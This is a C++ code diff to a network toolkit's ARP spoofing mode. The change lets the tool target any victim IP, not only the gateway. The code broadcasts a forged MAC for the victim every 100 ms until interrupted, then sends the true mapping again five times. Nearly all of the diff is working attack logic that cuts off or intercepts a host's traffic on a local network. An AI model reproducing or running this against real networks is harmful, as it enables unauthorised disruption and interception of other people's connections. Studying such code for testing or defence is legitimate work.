@@ -13,8 +13,7 @@ int main(int argc, char* argv[])
 {
     MY_TRY
     toolkit::Args args(argc, argv);
-    args.optional("attack,a", po::bool_switch(),
-                  "attack whole network by pretending myself to be gateway");
+    args.optional("attack,a", po::bool_switch(), "deploy arp attack");
     args.positional("ip", po::value<std::string>()->default_value(""), "ipv4 address", 1);
     args.parse();
 
@@ -41,21 +40,27 @@ int main(int argc, char* argv[])
         }
     } else {
         signal(SIGINT, onInterrupt);
-        net::Mac gateway_mac;
-        if (net::Transport::ip2mac(handle, apt.gateway, gateway_mac) == MyErrCode::kOk) {
-            ILOG("gateway {} is at {}", apt.gateway, gateway_mac);
+        net::Ip4 victim_ip = !opt_ip.empty() ? net::Ip4(opt_ip) : apt.gateway;
+        net::Mac victim_actual_mac;
+        if (net::Transport::ip2mac(handle, victim_ip, victim_actual_mac) == MyErrCode::kOk) {
+            ILOG("victim {} is at {}", victim_ip, victim_actual_mac);
         }
-        ILOG("forging gateway's mac to {}...", apt.mac);
-        auto lie = net::Packet::arp(apt.mac, apt.gateway, apt.mac, apt.ip, true);
+        net::Mac victim_forged_mac = victim_actual_mac;
+        victim_forged_mac.b6 += 1;
+        ILOG("forging victim's mac to {}...", victim_forged_mac);
+        auto lie = net::Packet::arp(victim_forged_mac, victim_ip, apt.mac, apt.ip, true);
         while (!end_attack) {
             CHECK_ERR_RET_INT(net::Transport::send(handle, lie));
-            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
         }
         ILOG("attack stopped");
-        if (net::Transport::ip2mac(handle, apt.gateway, gateway_mac, false) == MyErrCode::kOk) {
-            auto truth = net::Packet::arp(gateway_mac, apt.gateway, apt.mac, apt.ip, true);
-            CHECK_ERR_RET_INT(net::Transport::send(handle, truth));
-            ILOG("gateway's mac restored to {}", gateway_mac);
+        if (net::Transport::ip2mac(handle, victim_ip, victim_actual_mac, false) == MyErrCode::kOk) {
+            auto truth = net::Packet::arp(victim_actual_mac, victim_ip, apt.mac, apt.ip, true);
+            for (int i = 0; i < 5; ++i) {
+                CHECK_ERR_RET_INT(net::Transport::send(handle, truth));
+                std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            }
+            ILOG("victim's mac restored to {}", victim_actual_mac);
         }
     }
     MY_CATCH
